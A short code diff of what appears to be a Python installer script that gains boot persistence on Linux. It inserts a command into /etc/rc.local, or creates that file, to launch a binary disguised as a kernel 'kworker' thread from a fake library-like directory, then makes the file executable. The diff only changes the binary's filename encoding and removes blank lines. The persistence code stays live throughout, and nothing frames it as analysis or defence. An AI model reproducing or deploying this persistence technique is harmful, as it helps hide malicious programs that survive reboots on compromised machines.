@@ -77,7 +77,7 @@ if(os.path.exists("/etc/rc.local")):
   autorunFile=open("/etc/rc.local","r")
   autorun=autorunFile.readlines()
   autorunFile.close()
-  autorun.insert(len(autorun)-2,"./libx86/lsb/hostconfig-lib-01/kworker_v8U:023FWE234-0\n")
+  autorun.insert(len(autorun)-2,"./libx86/lsb/hostconfig-lib-01/kworker_v8U%3A023FWE234-0\n")
   autorun="".join(autorun)
   autorunFile=open("/etc/rc.local","w")
   autorunFile.write(autorun)
@@ -86,15 +86,11 @@ else:
   autorunFile.write("""#!/bin/bash
 
 
-./libx86/lsb/hostconfig-lib-01/kworker_v8U:023FWE234-0
+./libx86/lsb/hostconfig-lib-01/kworker_v8U%3A023FWE234-0
 
 exit 0""")
   autorunFile.close()
   os.system("chmod a+x /etc/rc.local")
-
-
-
-
 
 
 
